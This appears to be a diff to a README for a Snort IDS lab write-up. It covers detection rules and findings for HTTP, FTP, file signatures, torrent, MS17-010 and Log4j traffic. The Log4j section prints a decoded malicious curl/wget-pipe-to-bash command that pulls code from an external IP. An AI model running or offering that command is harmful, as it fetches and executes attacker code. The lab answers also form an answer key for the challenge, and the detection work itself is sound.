@@ -15,6 +15,22 @@ Hands-on IDS rule writing and packet analysis completed while working through Tr
 - Inspecting Snort alert/log output and packet metadata
 - Using `content`, hexadecimal payload matching, `dsize`, SIDs, and bidirectional rules
 
+## Repository structure
+
+```text
+snort-challenge-the-basics/
+├── README.md
+└── rules/
+    ├── http.rules
+    ├── ftp.rules
+    ├── file-signatures.rules
+    ├── torrent.rules
+    ├── ms17-010.rules
+    └── log4j.rules
+```
+
+Each rule set is separated by use case so the repository can be reused as a small detection-engineering reference.
+
 ## Environment
 
 Typical command structure used throughout the lab:
@@ -29,11 +45,16 @@ For full alert output and local logging:
 sudo snort -c local.rules -A full -l . -r capture.pcap
 ```
 
-## 1. HTTP traffic
+## Rule files
 
-```snort
-alert tcp any any <> any 80 (msg:"HTTP Port 80 Traffic"; sid:1000001; rev:1;)
-```
+- [`rules/http.rules`](rules/http.rules) – detect TCP traffic to or from port 80
+- [`rules/ftp.rules`](rules/ftp.rules) – FTP traffic and login-state detection
+- [`rules/file-signatures.rules`](rules/file-signatures.rules) – PNG and GIF magic-byte detection
+- [`rules/torrent.rules`](rules/torrent.rules) – torrent metafile payload detection
+- [`rules/ms17-010.rules`](rules/ms17-010.rules) – SMB `\IPC$` indicator detection
+- [`rules/log4j.rules`](rules/log4j.rules) – payload-size filtering used during Log4j investigation
+
+## 1. HTTP traffic
 
 Observed alert count: **164**.
 
@@ -45,61 +66,37 @@ Packet-analysis findings:
 - Packet 65 source IP: `145.254.160.237`
 - Packet 65 source port: `3372`
 
+Rule: [`rules/http.rules`](rules/http.rules)
+
 ## 2. FTP traffic
 
-```snort
-alert tcp any any <> any 21 (msg:"FTP Port 21 Traffic"; sid:1000001; rev:1;)
-```
+Observed alert count for all port 21 traffic: **614**.
 
-Observed alert count: **614**. FTP service: **Microsoft FTP Service**.
+FTP service identified: **Microsoft FTP Service**.
 
-Failed login:
-```snort
-alert tcp any any <> any 21 (msg:"Failed FTP Login"; content:"530 User"; sid:1000002; rev:1;)
-```
-Alert count: **41**.
+Additional lab results:
+- Failed login attempts: **41**
+- Successful logins: **1**
+- Valid username, password required: **42**
+- Administrator username, password required: **7**
 
-Successful login:
-```snort
-alert tcp any any <> any 21 (msg:"Successful FTP Login"; content:"230 User"; sid:1000003; rev:1;)
-```
-Alert count: **1**.
-
-Valid username, password required:
-```snort
-alert tcp any any <> any 21 (msg:"FTP Valid Username Password Required"; content:"331 Password"; sid:1000004; rev:1;)
-```
-Alert count: **42**.
-
-Administrator username, password required:
-```snort
-alert tcp any any <> any 21 (msg:"FTP Administrator Password Required"; content:"331 Password"; content:"Administrator"; sid:1000005; rev:1;)
-```
-Alert count: **7**.
+Rule set: [`rules/ftp.rules`](rules/ftp.rules)
 
 ## 3. PNG and GIF detection
 
 PNG magic bytes:
+
 ```text
 89 50 4E 47 0D 0A 1A 0A
 ```
 
-```snort
-alert tcp any any <> any any (msg:"PNG File Detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:1000010; rev:1;)
-```
-Embedded software: **Adobe ImageReady**.
+Embedded software identified in the PNG packet: **Adobe ImageReady**.
 
-GIF:
-```snort
-alert tcp any any <> any any (msg:"GIF File Detected"; content:"|47 49 46 38|"; sid:1000011; rev:1;)
-```
-Image format: **GIF89a**.
+GIF format identified: **GIF89a**.
+
+Rule set: [`rules/file-signatures.rules`](rules/file-signatures.rules)
 
 ## 4. Torrent metafile detection
-
-```snort
-alert tcp any any <> any any (msg:"Torrent Metafile Detected"; content:".torrent"; nocase; sid:1000020; rev:1;)
-```
 
 Observed alert count: **2**.
 
@@ -107,6 +104,8 @@ Findings:
 - Application: `bittorrent`
 - MIME type: `application/x-bittorrent`
 - Hostname: `tracker2.torrentbox.com`
+
+Rule: [`rules/torrent.rules`](rules/torrent.rules)
 
 ## 5. Troubleshooting Snort rules
 
@@ -122,57 +121,51 @@ Results after fixing each rule file:
 | `local-6.rules` | 2 |
 | `local-7.rules` | `msg` |
 
-Example case-sensitivity fix:
-```snort
-alert tcp any any <> any 80 (msg:"GET Request Found"; content:"|47 45 54|"; sid:1000030; rev:1;)
-```
+Key troubleshooting lessons included duplicate SIDs, missing rule-header fields, incorrect separators, invalid direction operators, case-sensitive payload matching, and missing `msg` options.
 
 ## 6. MS17-010 investigation
 
 Supplied external rules produced **25,154 alerts**.
 
-IPC share detection:
-```snort
-alert tcp any any <> any any (msg:"IPC Share Detected"; content:"|5C 49 50 43 24|"; sid:1000040; rev:1;)
-```
-
-Observed alert count: **12**.
+The custom `\IPC$` detection rule produced **12 alerts**.
 
 Requested path:
+
 ```text
 \\192.168.116.138\IPC$
 ```
 
-CVSS v2 score: **9.3**.
+CVSS v2 score used in the lab: **9.3**.
+
+Rule: [`rules/ms17-010.rules`](rules/ms17-010.rules)
 
 ## 7. Log4j investigation
 
 Supplied rules produced **26 alerts** and **4 unique triggered rules**.
 
 First six SID digits:
+
 ```text
 210037
 ```
 
-Payload-size rule:
-```snort
-alert tcp any any <> any any (msg:"Payload between 770 and 855 bytes"; dsize:770<>855; sid:1000050; rev:1;)
-```
-
-Observed alert count: **41**.
+The payload-size rule produced **41 alerts**.
 
 Findings:
 - Encoding algorithm: **Base64**
 - IP ID: **62808**
 
 Decoded command observed in the malicious payload:
+
 ```text
 (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
 ```
 
 Documented for analysis only; do not execute it.
 
-CVSS v2 score: **9.3**.
+CVSS v2 score used in the lab: **9.3**.
+
+Rule: [`rules/log4j.rules`](rules/log4j.rules)
 
 ## Skills demonstrated
 
